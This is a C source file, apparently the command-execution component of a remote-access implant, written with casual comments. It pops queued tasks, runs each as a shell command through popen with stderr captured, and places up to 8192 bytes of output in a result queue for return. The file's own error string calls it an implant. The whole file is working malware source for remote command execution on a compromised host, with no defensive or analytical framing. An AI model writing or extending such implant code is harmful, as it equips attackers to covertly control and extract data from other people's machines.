#include "payload.h"
#include "task_queue.h"
#include "result_queue.h"
#include "config.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>





#define MAX_OUTPUT 8192 // not a random number 🤫

// ramen lmao
static char *slurp(FILE *f) {
    char *buf = malloc(MAX_OUTPUT + 1);
    if(!buf) return NULL;

    size_t n = fread(buf, 1, MAX_OUTPUT, f); // reading the output of the command
    buf[n] = '\0'; // i hate this sneaky lil character

    return buf;
}


int execute_payload(PayloadContext *ctx) {

    // printf("%s\n", ctx->tq->tasks[0].cmd);

    // if (ctx->tq->len > 0) {
    //     printf("next cmd in queue: %s\n", ctx->tq->tasks[0].cmd);
    // } else {
    //     // no tasks to show
    //     printf("payload_job: queue is empty\n");
    // }


    Task t;
    if(tq_pop(ctx->tq, &t) == 0) {
        // printf("huh nothing here, debug\n");
        return 0;
    };

    // execution and capture of stdout and stderr
    char cmdline[512];
    snprintf(cmdline, sizeof cmdline, "%s 2>&1", t.cmd);

    FILE *f = popen(cmdline, "r");
    if(!f) {
        rq_add(ctx->rq, t.id, "*", "Implant failed to execute command");
        free(t.cmd);
        // printf("huh this failed, debug\n");
        return -1;
    }

    char *output = slurp(f);
    pclose(f);

    if(!output) output = strdup("NO OUTPUT");

    rq_add(ctx->rq, t.id, "*", output);
    printf("✅ - Executed task %d, output: %s\n", t.id, output);

    free(output);
    free(t.cmd);
    return 1;
}



void payload_job(void *c) {
    PayloadContext *ctx = (PayloadContext *)c;
    int rc; // result code? idk what to name this one

    while((rc = execute_payload(ctx)) == 1) {}

    if(rc < 0) {
        printf("💥 - hell nah payload job hit an error\n");
    }
}